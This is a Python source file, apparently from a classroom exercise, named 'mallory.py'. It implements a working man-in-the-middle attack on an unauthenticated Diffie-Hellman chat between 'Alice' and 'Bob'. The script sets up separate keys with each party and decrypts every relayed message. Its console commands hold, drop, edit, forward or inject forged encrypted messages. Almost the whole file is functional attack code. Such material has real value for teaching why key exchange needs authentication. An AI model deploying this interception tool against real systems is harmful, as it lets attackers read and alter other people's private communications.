# mallory.py
import socket, threading, os, base64, re, sys
from utils import send_obj, recv_obj
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# DH params (same as Alice/Bob)
p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1
g = 2
LISTEN_PORT = 5000
BOB_IP = "192.168.15.137"
BOB_PORT = 5000

# Gatekeeper flag
gatekeeper = False

# pending queues: each entry is {"text": str, "send_func": callable}
pending = {
    "alice": [],
    "bob": []
}

pend_lock = threading.Lock()

def derive_key_from_int(shared_int):
    bs = shared_int.to_bytes((shared_int.bit_length()+7)//8 or 1, "big")
    hkdf = HKDF(algorithm=hashes.SHA256(), length=32, salt=None, info=b"dh-chat")
    return hkdf.derive(bs)

def dh_priv(): return int.from_bytes(os.urandom(32), "big") % (p-2) + 2
def dh_pub(priv): return pow(g, priv, p)
def dh_shared(pub, priv): return pow(pub, priv, p)

def parse_quoted(cmd: str):
    m = re.search(r'"(.*)"', cmd)
    return m.group(1) if m else None

# ----------------------------------------------------------
# NEW GLOBAL SESSION STATE (Fixes /msg)
# ----------------------------------------------------------
current_session = {
    "alice_sock": None,
    "bob_sock": None,
    "aes_a": None,
    "aes_b": None
}
# ----------------------------------------------------------

def handle_command(line: str):
    global gatekeeper

    line = line.strip()
    if not line:
        return

    if line == "/gatekeeper on":
        gatekeeper = True
        print("[MALLORY] Gatekeeper ENABLED")
        return

    if line == "/gatekeeper off":
        gatekeeper = False
        print("[MALLORY] Gatekeeper DISABLED")
        with pend_lock:
            for _ in range(len(pending["alice"])):
                item = pending["alice"].pop(0)
                item["send_func"](item["text"])
                print(f'[MALLORY]: *Forwarded* - [ALICE->BOB] {item["text"]}')
            for _ in range(len(pending["bob"])):
                item = pending["bob"].pop(0)
                item["send_func"](item["text"])
                print(f'[MALLORY]: *Forwarded* - [BOB->ALICE] {item["text"]}')
        return

    # ----------------------------------------------------------
    # FIXED /msg USING GLOBAL SESSION STATE
    # ----------------------------------------------------------
    if line.startswith("/msg "):
        parts = line.split(" ", 2)
        if len(parts) < 3:
            print('[MALLORY] Usage: /msg alice "text"')
            return

        target = parts[1].lower()
        if target not in ("alice", "bob"):
            print("[MALLORY] Target must be alice or bob")
            return

        text = parse_quoted(line)
        if text is None:
            print('[MALLORY] /msg requires quoted text: /msg alice "hello"')
            return

        # ensure active session exists
        if current_session["alice_sock"] is None:
            print("[MALLORY] No active session")
            return

        if target == "alice":
            sock = current_session["alice_sock"]
            aes = current_session["aes_a"]
        else:
            sock = current_session["bob_sock"]
            aes = current_session["aes_b"]

        nonce = os.urandom(12)
        ct = aes.encrypt(nonce, text.encode(), None)

        send_obj(sock, {
            "type": "encrypted",
            "nonce": base64.b64encode(nonce).decode(),
            "ct": base64.b64encode(ct).decode()
        })

        print(f'[MALLORY]: *Injected* - [{target.upper()}] {text}')
        return
    # ----------------------------------------------------------

    # /edit target "text"
    if line.startswith("/edit "):
        parts = line.split(" ", 2)
        if len(parts) < 3:
            print('[MALLORY] Usage: /edit alice "text"')
            return
        target = parts[1].lower()
        if target not in ("alice", "bob"):
            print("[MALLORY] Choose alice or bob")
            return
        text = parse_quoted(line)
        if text is None:
            print('[MALLORY] /edit requires quoted text')
            return
        with pend_lock:
            queue = pending[target]
            if not queue:
                print(f"[MALLORY] No pending {target} messages to edit")
                return
            item = queue.pop(0)
        item["send_func"](text)
        print(f'[MALLORY]: *Edited* - [{target.upper()}->{"BOB" if target=="alice" else "ALICE"}] {text}')
        return

    # /drop
    if line.startswith("/drop "):
        parts = line.split()
        if len(parts) < 2:
            print("[MALLORY] Usage: /drop alice")
            return
        target = parts[1].lower()
        if target not in ("alice", "bob"):
            print("[MALLORY] Choose alice or bob")
            return
        with pend_lock:
            queue = pending[target]
            if not queue:
                print(f"[MALLORY] No pending {target} messages to drop")
                return
            item = queue.pop(0)
        print(f'[MALLORY]: *Dropped* - [{target.upper()}->{"BOB" if target=="alice" else "ALICE"}] {item["text"]}')
        return

    # /forward
    if line.startswith("/forward "):
        parts = line.split()
        if len(parts) < 2:
            print("[MALLORY] Usage: /forward alice")
            return
        target = parts[1].lower()
        if target not in ("alice", "bob"):
            print("[MALLORY] Choose alice or bob")
            return
        with pend_lock:
            queue = pending[target]
            if not queue:
                print(f"[MALLORY] No pending {target} messages to forward")
                return
            item = queue.pop(0)
        item["send_func"](item["text"])
        print(f'[MALLORY]: *Forwarded* - [{target.upper()}->{"BOB" if target=="alice" else "ALICE"}] {item["text"]}')
        return

    print("[MALLORY] Unknown command")

session_senders = {}

def handle_client(alice_sock, addr):
    global current_session

    thread_id = threading.current_thread().ident
    print("[Mallory] Alice connected from", addr)

    # DH with Alice
    m = recv_obj(alice_sock)
    a_pub = int(m["pub"])
    a_priv = dh_priv()
    a_pub_m = dh_pub(a_priv)
    send_obj(alice_sock, {"type": "dh_pub", "pub": str(a_pub_m)})
    shared_a = dh_shared(a_pub, a_priv)
    aes_a = AESGCM(derive_key_from_int(shared_a))
    print("[Mallory] Key with Alice established")

    # DH with Bob
    bob_sock = socket.create_connection((BOB_IP, BOB_PORT))
    b_priv = dh_priv()
    b_pub_m = dh_pub(b_priv)
    send_obj(bob_sock, {"type": "dh_pub", "pub": str(b_pub_m)})
    m2 = recv_obj(bob_sock)
    b_pub = int(m2["pub"])
    aes_b = AESGCM(derive_key_from_int(dh_shared(b_pub, b_priv)))
    print("[Mallory] Key with Bob established")

    # ----------------------------------------------------------
    # SAVE SESSION GLOBALLY
    # ----------------------------------------------------------
    current_session["alice_sock"] = alice_sock
    current_session["bob_sock"] = bob_sock
    current_session["aes_a"] = aes_a
    current_session["aes_b"] = aes_b
    # ----------------------------------------------------------

    def send_to_alice(text):
        nonce = os.urandom(12)
        ct = aes_a.encrypt(nonce, text.encode(), None)
        send_obj(alice_sock, {
            "type": "encrypted",
            "nonce": base64.b64encode(nonce).decode(),
            "ct": base64.b64encode(ct).decode()
        })

    def send_to_bob(text):
        nonce = os.urandom(12)
        ct = aes_b.encrypt(nonce, text.encode(), None)
        send_obj(bob_sock, {
            "type": "encrypted",
            "nonce": base64.b64encode(nonce).decode(),
            "ct": base64.b64encode(ct).decode()
        })

    session_senders[thread_id] = {
        "send_to_alice": send_to_alice,
        "send_to_bob": send_to_bob
    }

    # Relay threads
    def from_alice():
        try:
            while True:
                m = recv_obj(alice_sock)
                if not m:
                    break
                if m.get("type") == "encrypted":
                    nonce = base64.b64decode(m["nonce"])
                    pt = aes_a.decrypt(nonce, base64.b64decode(m["ct"]), None).decode()
                    if not gatekeeper:
                        send_to_bob(pt)
                        print(f"[ALICE->BOB] {pt}")
                    else:
                        with pend_lock:
                            pending["alice"].append({"text": pt, "send_func": send_to_bob})
                        print(f"[MALLORY] Intercepted and HELD - [ALICE->BOB] {pt}")
                elif m.get("type") == "close":
                    send_obj(bob_sock, {"type": "close"})
                    break
        except Exception as e:
            print("[Mallory] from_alice ended:", e)

    def from_bob():
        try:
            while True:
                m = recv_obj(bob_sock)
                if not m:
                    break
                if m.get("type") == "encrypted":
                    nonce = base64.b64decode(m["nonce"])
                    pt = aes_b.decrypt(nonce, base64.b64decode(m["ct"]), None).decode()
                    if not gatekeeper:
                        send_to_alice(pt)
                        print(f"[BOB->ALICE] {pt}")
                    else:
                        with pend_lock:
                            pending["bob"].append({"text": pt, "send_func": send_to_alice})
                        print(f"[MALLORY] Intercepted and HELD - [BOB->ALICE] {pt}")
                elif m.get("type") == "close":
                    send_obj(alice_sock, {"type": "close"})
                    break
        except Exception as e:
            print("[Mallory] from_bob ended:", e)

    t1 = threading.Thread(target=from_alice, daemon=True)
    t2 = threading.Thread(target=from_bob, daemon=True)
    t1.start(); t2.start()
    t1.join(); t2.join()

    session_senders.pop(thread_id, None)
    alice_sock.close()
    bob_sock.close()
    print("[Mallory] Session ended")

def main():
    print("Available commands:")
    print("  /gatekeeper on | /gatekeeper off")
    print('  /msg alice "text"')
    print('  /msg bob   "text"')
    print("  /forward alice|bob")
    print("  /drop alice|bob")
    print('  /edit alice|bob "text"')

    def console_loop():
        while True:
            try:
                line = input()
            except EOFError:
                break
            handle_command(line)

    threading.Thread(target=console_loop, daemon=True).start()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", LISTEN_PORT))
    s.listen(1)
    print("[Mallory] listening on port", LISTEN_PORT)

    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    main()
